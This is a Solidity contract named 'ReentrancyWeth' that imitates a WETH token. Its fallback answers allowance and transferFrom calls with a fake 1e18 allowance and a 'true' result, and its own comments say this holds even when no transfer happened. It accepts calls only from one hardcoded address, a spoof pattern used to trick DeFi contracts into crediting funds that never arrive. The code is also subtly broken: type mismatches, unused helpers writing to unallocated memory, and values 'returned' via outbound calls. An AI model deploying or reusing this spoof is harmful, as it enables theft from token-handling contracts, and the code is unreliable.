pragma solidity ^0.8.0;

contract ReentrancyWeth {

    function bytes32ToAddress(bytes32 b) private pure returns (address a) {
        assembly { a := mload(add(b, 0x14)) }
    }

    function allowance(bytes memory input) private pure returns (bytes memory) {
        bytes32 amount = bytes32ToAddress(bytes32(input));
        // Return a high allowance value in the first 32 bytes
        bytes memory response;
        assembly {
            mstore(response, 1000000000000000000)
        }
        return response;
    }

    function transferFrom(bytes memory input) private pure returns (bytes memory) {
        bytes32 amount = bytes32ToAddress(bytes32(input));
        // Return true even if the WETH didn't actually transfer
        bytes memory response;
        assembly {
            mstore(response, 0x01)
        }
        return response;
    }

    // Handle both allowance and transferFrom calls
    fallback() external {
        if (msg.sender != 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968) {
            revert("Unauthorized sender");
        }

        if (msg.sig == 0xdd62ed3e) {
            // ABI selector for allowance(address owner, address spender)
            (address owner, address spender) = abi.decode(msg.data[4:], (address, address));
            // Return 1e18 as allowance
            (bool success, ) = spender.call{value: 0}(abi.encode(1000000000000000000));
            require(success,"Allowance failed");
        } else if (msg.sig == 0x23b872dd) {
            // ABI selector for transferFrom(address owner, address spender, uint256 amount)
            (address owner, address spender, uint256 amount) = abi.decode(msg.data[4:], (address, address, uint256));
            // Return true even if no transfer happened
            (bool success, ) = spender.call{value: 0}(abi.encode(true));
            require(success,"TransferFrom failed");
        }
    }


    receive() external payable {
        // Accept ETH deposits if needed
    }
}